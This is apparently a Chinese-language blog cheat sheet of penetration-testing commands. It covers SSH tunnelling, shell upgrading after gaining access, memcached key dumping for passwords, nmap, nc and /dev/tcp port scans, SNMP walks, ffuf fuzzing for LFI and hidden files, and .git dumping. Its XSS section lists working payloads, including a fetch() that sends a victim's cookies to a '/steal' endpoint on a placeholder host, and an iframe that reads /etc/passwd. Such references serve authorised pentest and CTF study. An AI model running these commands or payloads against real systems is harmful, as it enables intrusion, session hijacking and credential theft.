<h4 id="SSH端口转发操作"><a href="#SSH端口转发操作" class="headerlink" title="SSH端口转发操作"></a>SSH端口转发操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">ssh user@&lt;RHOST&gt; -oKexAlgorithms=+diffie-hellman-group1-sha1<br><br>ssh -R <span class="hljs-number">8080</span>:&lt;LHOST&gt;:<span class="hljs-number">80</span> &lt;RHOST&gt;<br>ssh -L <span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span> &lt;USERNAME&gt;@&lt;RHOST&gt;<br>ssh -N -L <span class="hljs-number">1234</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1234</span> &lt;USERNAME&gt;@&lt;RHOST&gt;<br><br>ssh -L <span class="hljs-number">80</span>:&lt;LHOST&gt;:<span class="hljs-number">80</span> &lt;RHOST&gt;<br>ssh -L <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">80</span>:&lt;LHOST&gt;:<span class="hljs-number">80</span> &lt;RHOST&gt;<br>ssh -L <span class="hljs-number">80</span>:localhost:<span class="hljs-number">80</span> &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h4 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h4><h5 id="获取服务器时间"><a href="#获取服务器时间" class="headerlink" title="获取服务器时间"></a>获取服务器时间</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nmap -sU -p <span class="hljs-number">123</span> --script ntp-info &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="停止-VIRTUALBOX-GUEST-UTILS-以停止同步时间"><a href="#停止-VIRTUALBOX-GUEST-UTILS-以停止同步时间" class="headerlink" title="停止 VIRTUALBOX-GUEST-UTILS 以停止同步时间"></a>停止 VIRTUALBOX-GUEST-UTILS 以停止同步时间</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo /etc/init.d/virtualbox-guest-utils stop<br></code></pre></td></tr></table></figure>

<h5 id="停止-SYSTEMD-TIMESYNCD-以手动同步时间"><a href="#停止-SYSTEMD-TIMESYNCD-以手动同步时间" class="headerlink" title="停止 SYSTEMD-TIMESYNCD 以手动同步时间"></a>停止 SYSTEMD-TIMESYNCD 以手动同步时间</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo systemctl stop systemd-timesyncd<br></code></pre></td></tr></table></figure>

<h5 id="禁用自动同步"><a href="#禁用自动同步" class="headerlink" title="禁用自动同步"></a>禁用自动同步</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo systemctl disable --now chronyd<br></code></pre></td></tr></table></figure>

<h5 id="设置日期和时间的选项"><a href="#设置日期和时间的选项" class="headerlink" title="设置日期和时间的选项"></a>设置日期和时间的选项</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo net time -c &lt;RHOST&gt;<br>sudo net time <span class="hljs-built_in">set</span> -S &lt;RHOST&gt;<br>sudo net time \\&lt;RHOST&gt; /<span class="hljs-built_in">set</span> /y<br>sudo ntpdate &lt;RHOST&gt;<br>sudo ntpdate -s &lt;RHOST&gt;<br>sudo ntpdate -b -u &lt;RHOST&gt;<br>sudo timedatectl <span class="hljs-built_in">set</span>-timezone UTC<br>sudo timedatectl <span class="hljs-built_in">list</span>-timezones<br>sudo timedatectl <span class="hljs-built_in">set</span>-timezone <span class="hljs-string">&#x27;&lt;COUNTRY&gt;/&lt;CITY&gt;&#x27;</span><br>sudo timedatectl <span class="hljs-built_in">set</span>-time <span class="hljs-number">15</span>:<span class="hljs-number">58</span>:<span class="hljs-number">30</span><br>sudo timedatectl <span class="hljs-built_in">set</span>-time <span class="hljs-string">&#x27;2015-11-20 16:14:50&#x27;</span><br>sudo timedatectl <span class="hljs-built_in">set</span>-local-rtc <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h5 id="与服务器保持同步"><a href="#与服务器保持同步" class="headerlink" title="与服务器保持同步"></a>与服务器保持同步</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> [ <span class="hljs-number">1</span> ]; <span class="hljs-keyword">do</span> sudo ntpdate &lt;RHOST&gt;;done<br></code></pre></td></tr></table></figure>

<h4 id="快捷命令"><a href="#快捷命令" class="headerlink" title="快捷命令"></a>快捷命令</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">ctrl b + w    # 显示窗口<br>ctrl + <span class="hljs-string">&quot;      # 水平拆分窗口</span><br><span class="hljs-string">ctrl + %      # 垂直拆分窗口</span><br><span class="hljs-string">ctrl + ,      # 重命名窗口</span><br><span class="hljs-string">ctrl + &#123;      # 翻转窗口</span><br><span class="hljs-string">ctrl + &#125;      # 翻转窗口</span><br><span class="hljs-string">ctrl + spacebar    # 开关窗格布局</span><br></code></pre></td></tr></table></figure>

<p>复制和粘贴</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">:setw -g mode-keys vi<br>ctrl b + [<br>space<br>enter<br>ctrl b + ]<br></code></pre></td></tr></table></figure>

<p>搜索</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">ctrl b + [    # 输入复制内容<br>ctrl + /      # 在vi模式的复制模式下输入搜索<br>n             # 搜索下一个<br>shift + n     # 反向搜索<br></code></pre></td></tr></table></figure>

<p>记录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ctrl b<br>shift + P    <span class="hljs-meta"># start / stop</span><br></code></pre></td></tr></table></figure>

<p>保存输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">ctrl b + :<br>capture-pane -S -<br>ctrl b + :<br>save-buffer &lt;FILE&gt;.txt<br></code></pre></td></tr></table></figure>

<h4 id="升级SHELL"><a href="#升级SHELL" class="headerlink" title="升级SHELL"></a>升级SHELL</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br>ctrl + z<br>stty raw -echo<br>fg<br>Enter<br>Enter<br>export XTERM=xterm<br></code></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">script -q /dev/null -c bash<br>/usr/bin/script -qc /bin/bash /dev/null<br></code></pre></td></tr></table></figure>

<h3 id="切换shell环境为完整的shell环境"><a href="#切换shell环境为完整的shell环境" class="headerlink" title="切换shell环境为完整的shell环境"></a>切换shell环境为完整的shell环境</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows <span class="hljs-number">38</span> columns <span class="hljs-number">116</span>; reset;<br></code></pre></td></tr></table></figure>

<h4 id="修复隧道shell环境"><a href="#修复隧道shell环境" class="headerlink" title="修复隧道shell环境"></a>修复隧道shell环境</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">env reset<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">stty onlcr<br></code></pre></td></tr></table></figure>

<h4 id="VirtualBox-完善SHELL环境"><a href="#VirtualBox-完善SHELL环境" class="headerlink" title="VirtualBox - 完善SHELL环境"></a>VirtualBox - 完善SHELL环境</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo pkill VBoxClient &amp;&amp; VBoxClient --clipboard<br></code></pre></td></tr></table></figure>

<h4 id="virtualenv-激活虚拟shell环境"><a href="#virtualenv-激活虚拟shell环境" class="headerlink" title="virtualenv - 激活虚拟shell环境"></a>virtualenv - 激活虚拟shell环境</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo apt-get install virtualenv<br>virtualenv -p python2<span class="hljs-number">.7</span> venv<br>. venv/bin/activate<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">python.exe -m pip install virtualenv<br>python.exe -m virtualenv venv<br>venv\Scripts\activate<br></code></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="内存缓存工具"><a href="#内存缓存工具" class="headerlink" title="内存缓存工具"></a>内存缓存工具</h4><p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/pd4d10/memcached-cli">https://github.com/pd4d10/memcached-cli</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">memcrashed / <span class="hljs-number">11211</span>/UDP<br><br>npm install -g memcached-cli<br>memcached-cli &lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;RHOST&gt;:<span class="hljs-number">11211</span><br>echo -en <span class="hljs-string">&quot;\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n&quot;</span> | nc -q1 -u <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">11211</span><br><br>STAT pid <span class="hljs-number">21357</span><br>STAT uptime <span class="hljs-number">41557034</span><br>STAT time <span class="hljs-number">1519734962</span><br><br>sudo nmap &lt;RHOST&gt; -p <span class="hljs-number">11211</span> -sU -sS --script memcached-info<br><br>stats items<br>stats cachedump <span class="hljs-number">1</span> <span class="hljs-number">0</span><br>get link<br>get file<br>get user<br>get passwd<br>get account<br>get username<br>get password<br></code></pre></td></tr></table></figure>

<h4 id="NetBIOS服务：137端口-139端口"><a href="#NetBIOS服务：137端口-139端口" class="headerlink" title="NetBIOS服务：137端口~139端口"></a>NetBIOS服务：137端口~139端口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">nbtscan &lt;RHOST&gt;<br>nmblookup -A &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h4 id="nmap端口扫描工具"><a href="#nmap端口扫描工具" class="headerlink" title="nmap端口扫描工具"></a>nmap端口扫描工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nmap -A -T4 -sC -sV -p- &lt;RHOST&gt;<br>sudo nmap -sV -sU &lt;RHOST&gt;<br>sudo nmap -A -T4 -sC -sV --script vuln &lt;RHOST&gt;<br>sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery &lt;RHOST&gt;<br>sudo nmap -sC -sV -p- --scan-delay <span class="hljs-number">5</span>s &lt;RHOST&gt;<br>sudo nmap $TARGET -p <span class="hljs-number">88</span> --script krb5-<span class="hljs-class"><span class="hljs-keyword">enum</span>-<span class="hljs-title">users</span> --<span class="hljs-title">script</span>-<span class="hljs-title">args</span> <span class="hljs-title">krb5</span>-<span class="hljs-title">enum</span>-<span class="hljs-title">users</span>.<span class="hljs-title">realm</span>=</span><span class="hljs-string">&#x27;test&#x27;</span> &lt;RHOST&gt;<br>ls -lh /usr/share/nmap/scripts<span class="hljs-comment">/*ssh*</span><br><span class="hljs-comment">locate -r &#x27;\.nse$&#x27; | xargs grep categories | grep categories | grep &#x27;default\|version\|safe&#x27; | grep smb</span><br></code></pre></td></tr></table></figure>

<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> p in &#123;<span class="hljs-number">1.</span><span class="hljs-number">.65535</span>&#125;; <span class="hljs-keyword">do</span> nc -vn &lt;RHOST&gt; $p -w <span class="hljs-number">1</span> -z &amp; done <span class="hljs-number">2</span>&gt; &lt;FILE&gt;.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export ip=&lt;RHOST&gt;; <span class="hljs-keyword">for</span> port in $(seq <span class="hljs-number">1</span> <span class="hljs-number">65535</span>); <span class="hljs-keyword">do</span> timeout <span class="hljs-number">0.01</span> bash -c <span class="hljs-string">&quot;&lt;/dev/tcp/$ip/$port &amp;&amp; echo The port $port is open || echo The Port $port is closed &gt; /dev/null&quot;</span> <span class="hljs-number">2</span>&gt;/dev/null || echo Connection Timeout &gt; /dev/null; done<br></code></pre></td></tr></table></figure>

<h4 id="snmpwalk-工具使用"><a href="#snmpwalk-工具使用" class="headerlink" title="snmpwalk 工具使用"></a>snmpwalk 工具使用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">snmpwalk -c public -v1 &lt;RHOST&gt;<br>snmpwalk -v2c -c public &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.34</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span><br>snmpwalk -v2c -c public &lt;RHOST&gt; <span class="hljs-number">.1</span><br>snmpwalk -v2c -c public &lt;RHOST&gt; nsExtendObjects<br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.77</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.25</span><br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">.4</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">.1</span><span class="hljs-number">.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span><br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.77</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.77</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.27</span><br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.6</span><span class="hljs-number">.13</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span><br>snmpwalk -c public -v1 &lt;RHOST&gt; <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">.6</span><span class="hljs-number">.3</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span><br></code></pre></td></tr></table></figure>

<h3 id="WEB应用分析工具"><a href="#WEB应用分析工具" class="headerlink" title="WEB应用分析工具"></a>WEB应用分析工具</h3><h4 id="Burp-Suite-工具"><a href="#Burp-Suite-工具" class="headerlink" title="Burp Suite 工具"></a>Burp Suite 工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Ctrl+r          <span class="hljs-comment">// 向中继器发送请求</span><br>Ctrl+i          <span class="hljs-comment">// 向入侵者发送请求</span><br>Ctrl+Shift+b    <span class="hljs-comment">// base64编码</span><br>Ctrl+Shift+u    <span class="hljs-comment">// URL解码</span><br></code></pre></td></tr></table></figure>

<h4 id="设置代理环境变量"><a href="#设置代理环境变量" class="headerlink" title="设置代理环境变量"></a>设置代理环境变量</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">export HTTP_PROXY=http:<span class="hljs-comment">//localhost:8080</span><br>export HTTPS_PROXY=https:<span class="hljs-comment">//localhost:8080</span><br></code></pre></td></tr></table></figure>

<h4 id="cadaver-用于-WebDAV-协议的服务器进行交互"><a href="#cadaver-用于-WebDAV-协议的服务器进行交互" class="headerlink" title="cadaver 用于 WebDAV 协议的服务器进行交互"></a>cadaver 用于 WebDAV 协议的服务器进行交互</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cadaver http:<span class="hljs-comment">//&lt;RHOST&gt;/&lt;WEBDAV_DIRECTORY&gt;/</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">dav:/&lt;WEBDAV_DIRECTORY&gt;/&gt; cd C<br>dav:/&lt;WEBDAV_DIRECTORY&gt;/C/&gt; ls<br>dav:/&lt;WEBDAV_DIRECTORY&gt;/C/&gt; put &lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h4 id="跨站脚本-XSS"><a href="#跨站脚本-XSS" class="headerlink" title="跨站脚本 (XSS)"></a>跨站脚本 (XSS)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;sCrIpt&gt;alert(<span class="hljs-number">1</span>)&lt;/ScRipt&gt;<br>&lt;script&gt;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);&lt;/script&gt;<br>&lt;script&gt;alert(document.cookies)&lt;/script&gt;<br>&lt;script&gt;document.querySelector(<span class="hljs-string">&#x27;#foobar-title&#x27;</span>).textContent = <span class="hljs-string">&#x27;&lt;TEXT&gt;&#x27;</span>&lt;/script&gt;<br>&lt;script&gt;fetch(<span class="hljs-string">&#x27;https://&lt;RHOST&gt;/steal?cookie=&#x27;</span> + btoa(document.cookie));&lt;/script&gt;<br>&lt;script&gt;user.changeEmail(<span class="hljs-string">&#x27;user@domain&#x27;</span>);&lt;/script&gt;<br>&lt;iframe src=file:<span class="hljs-comment">///etc/passwd height=1000px width=1000px&gt;&lt;/iframe&gt;</span><br>&lt;img src=<span class="hljs-string">&#x27;http://&lt;RHOST&gt;&#x27;</span>/&gt;<br></code></pre></td></tr></table></figure>

<h4 id="FUFF"><a href="#FUFF" class="headerlink" title="FUFF"></a>FUFF</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/dirb/common.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/FUZZ --fs &lt;NUMBER&gt; -mc all</span><br>ffuf -w /usr/share/wordlists/dirb/common.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/FUZZ --fw &lt;NUMBER&gt; -mc all</span><br>ffuf -w /usr/share/wordlists/dirb/common.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/FUZZ -mc 200,204,301,302,307,401 -o results.txt</span><br>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/ -H &quot;Host: FUZZ.&lt;RHOST&gt;&quot; -fs 185</span><br>ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/<span class="hljs-number">4</span>-digits<span class="hljs-number">-0000</span><span class="hljs-number">-9999.</span>txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/backups/backup_2020070416FUZZ.zip</span><br></code></pre></td></tr></table></figure>

<h5 id="API-接口模糊测试"><a href="#API-接口模糊测试" class="headerlink" title="API 接口模糊测试"></a>API 接口模糊测试</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -u https:<span class="hljs-comment">//&lt;RHOST&gt;/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412</span><br></code></pre></td></tr></table></figure>

<h5 id="搜索-LFI-本地文件包含漏洞"><a href="#搜索-LFI-本地文件包含漏洞" class="headerlink" title="搜索 LFI 本地文件包含漏洞"></a>搜索 LFI 本地文件包含漏洞</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/admin../admin_staging/index.php?page=FUZZ -fs 15349</span><br></code></pre></td></tr></table></figure>

<h5 id="使用-PHP-SESSION-ID-进行模糊测试"><a href="#使用-PHP-SESSION-ID-进行模糊测试" class="headerlink" title="使用 PHP SESSION ID 进行模糊测试"></a>使用 PHP SESSION ID 进行模糊测试</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span>-lowercase<span class="hljs-number">-2.3</span>-small.txt  -u <span class="hljs-string">&quot;http://&lt;RHOST&gt;/admin/FUZZ.php&quot;</span> -b <span class="hljs-string">&quot;PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp&quot;</span> -fw <span class="hljs-number">2644</span><br></code></pre></td></tr></table></figure>

<h5 id="目录递归扫描"><a href="#目录递归扫描" class="headerlink" title="目录递归扫描"></a>目录递归扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-2.3</span>-small.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/cd/basic/FUZZ -recursion</span><br></code></pre></td></tr></table></figure>

<h5 id="设置固定的文件扩展名扫描"><a href="#设置固定的文件扩展名扫描" class="headerlink" title="设置固定的文件扩展名扫描"></a>设置固定的文件扩展名扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-2.3</span>-small.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/cd/ext/logs/FUZZ -e .log</span><br></code></pre></td></tr></table></figure>

<h5 id="速率限制"><a href="#速率限制" class="headerlink" title="速率限制"></a>速率限制</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-2.3</span>-small.txt -t <span class="hljs-number">5</span> -p <span class="hljs-number">0.1</span> -u http:<span class="hljs-comment">//&lt;RHOST&gt;/cd/rate/FUZZ -mc 200,429</span><br></code></pre></td></tr></table></figure>

<h5 id="虚拟主机子域名扫描"><a href="#虚拟主机子域名扫描" class="headerlink" title="虚拟主机子域名扫描"></a>虚拟主机子域名扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-5000.</span>txt -H <span class="hljs-string">&quot;Host: FUZZ.&lt;RHOST&gt;&quot;</span> -u http:<span class="hljs-comment">//&lt;RHOST&gt; -fs 1495</span><br></code></pre></td></tr></table></figure>

<h5 id="海量文件扩展名发现扫描"><a href="#海量文件扩展名发现扫描" class="headerlink" title="海量文件扩展名发现扫描"></a>海量文件扩展名发现扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ffuf -w /opt/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-1.0</span>.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/FUZZ -t 30 -c -H &#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27; -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip</span><br></code></pre></td></tr></table></figure>

<h4 id="GitTools"><a href="#GitTools" class="headerlink" title="GitTools"></a>GitTools</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"># 下载地址：https:<span class="hljs-comment">//github.com/internetwache/GitTools</span><br>./gitdumper.sh http:<span class="hljs-comment">//&lt;RHOST&gt;/.git/ /PATH/TO/FOLDER</span><br>./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/<br></code></pre></td></tr></table></figure>

